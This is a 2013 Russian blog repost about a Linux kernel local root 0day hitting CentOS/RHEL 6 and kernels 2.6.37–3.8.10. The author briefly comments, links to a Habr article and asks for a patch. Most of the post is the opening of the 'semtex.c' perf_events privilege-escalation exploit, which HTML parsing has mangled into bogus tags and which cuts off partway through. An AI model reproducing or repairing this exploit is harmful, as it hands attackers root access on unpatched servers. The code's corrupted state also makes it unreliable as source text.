---
layout: post
title: 0day уязвимость в 2.6.32 (CentOS/RHEL 6) и 2.6.37..3.8.10 (репост)
date: '2013-05-15 01:39:00'
tags:
- linux
- centos
- riepost
- linux_kernel_2_6
- bagh
- povyshieniie_privielieghii
- uiazvimost_
---

Вечерком попробую, а пока сохраню сюда, чтобы не потерялось.

Забавно, но мой [Carbon AS 3](http://www.carbonsoft.ru/products/carbon-as-3/carbon-as-3-2/) от этого не страдает - там ядро 2.4 :D

[http://habrahabr.ru/post/179735/](http://habrahabr.ru/post/179735/)

P.S: Если кто-нибудь видел патч для 2.6.32 в el6, поделитесь пожалуйста (актуально на 23:11 15.05.2013).

    /* * linux 2.6.37-3.x.x x86_64, ~100 LOC * gcc-4.6 -O2 semtex.c && ./a.out * 2010 sd@fucksheep.org, salut! * * update may 2013: * seems like centos 2.6.32 backported the perf bug, lol. * jewgold to 115T6jzGrVMgQ2Nt1Wnua7Ch1EuL9WXT2g if you insist. */#define _GNU_SOURCE 1#include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unistd.h>#include <sys mman.h="">#include <syscall.h>#include <stdint.h>#include <assert.h>#define BASE  0x380000000#define SIZE  0x010000000#define KSIZE  0x2000000#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))void fuck()="" {="" int="" i,j,k;="" uint64_t="" uids[4]="{" ab(2),="" ab(3),="" ab(4),="" ab(5)="" };="" uint8_t="" *current="*(uint8_t" **)(((uint64_t)uids)="" &="" (-8192));="" kbase="((uint64_t)current)">>36;  uint32_t *fixptr = (void*) AB(1);  *fixptr = -1;  for (i=0; i<4000; i+="4)" {="" uint64_t="" *p="(void" *)&current[i];="" uint32_t="" *t="(void*)" p[0];="" if="" ((p[0]="" !="p[1])" ||="">>36) != kbase)) continue;    for (j=0; j</4000;></32)^((uint64_t)((x)*313337))))void></assert.h></stdint.h></syscall.h></sys></unistd.h></string.h></stdlib.h></stdio.h></stdint.h>